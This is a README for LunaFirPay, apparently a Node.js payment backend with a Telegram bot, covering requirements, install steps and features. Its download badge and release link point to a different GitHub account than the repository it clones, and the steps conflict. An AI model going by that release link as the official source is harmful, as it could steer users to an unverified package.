# 💳 LunaFirPay - Easy Payment Processing for Everyone

<div align="center">
[![Download LunaFirPay](https://img.shields.io/badge/Download-LunaFirPay-brightgreen?style=flat-square)](https://github.com/neptun2202/LunaFirPay/releases)
</div>

---

## 🌟 Overview

LunaFirPay is a high-performance payment platform backend built on Node.js. It provides a quick and efficient way to handle payments. With features like a built-in Telegram bot and various payment plugins, it serves as an excellent choice for anyone looking to set up a reliable payment system.

## 📋 System Requirements

Before you start, ensure your system meets these requirements:

- **Node.js** version 18 or higher
- **MySQL** version 8 or higher
- **Memory**: At least 1 GB

> **Warning:** For production use, you must enable a Web Application Firewall (WAF). This can be achieved through options like ChangTing, BaoTa, or KaiXin.

## 🚀 Getting Started

Follow these steps to download and run LunaFirPay.

### Step 1: Prepare Your Environment

1. **Install Node.js**: Go to the [Node.js website](https://nodejs.org/) and download the installer for your operating system. Follow the instructions to install Node.js.
   
2. **Install MySQL**: Visit the [MySQL website](https://www.mysql.com/) to download and install the MySQL server.

### Step 2: Download LunaFirPay

Visit [this page to download](https://github.com/neptun2202/LunaFirPay/releases) LunaFirPay. Look for the latest version and download the package suitable for your operating system.

### Step 3: Clone the Repository

Open a command line or terminal window. Run these commands:

```bash
# Clone the repository
git clone https://github.com/Skynami/LunaFirPay.git
cd LunaFirPay
```

### Step 4: Install Dependencies

To install required packages, run the following command in your terminal:

```bash
npm install
```

### Step 5: Set Up MySQL Database

1. Open your MySQL client and create a new database for LunaFirPay.
2. Set up the necessary tables as specified in the provided schema documentation within the repository folders.

### Step 6: Configure Settings

Edit the configuration file found in the repository to set your database connection details, API keys, and other necessary settings.

### Step 7: Run the Application

After configuring, you can start the application. Run the following command in your terminal:

```bash
node index.js
```

## 🔧 Features

LunaFirPay includes several appealing features:

| Feature | Description |
|---------|-------------|
| 🤖 **Telegram Bot** | Get payment notifications, balance checks, and management without any extra development work. |
| 🔒 **Proxy Callback** | Supports callback forwarding through proxy servers to keep your source IP safe. |
| ⚡ **High Performance** | Handles high concurrency efficiently while using minimal resources. |
| 🔌 **Plugin Support** | Comes with over 56 payment channel plugins that can be hot-loaded. |

## ⚙️ Troubleshooting

If you experience any issues, consider these common solutions:

- **Node.js not recognized?** Ensure Node.js is in your system's PATH.
- **MySQL connection error?** Double-check your database configuration settings.
- **Port already in use?** Change the default port in the configuration file.

## 📞 Support

For further assistance, join our [Telegram Group](https://t.me/lunafirserver) to connect with the community and get support.

By following the steps outlined above, you should be able to download and run LunaFirPay smoothly. Enjoy streamlined payment processing with ease.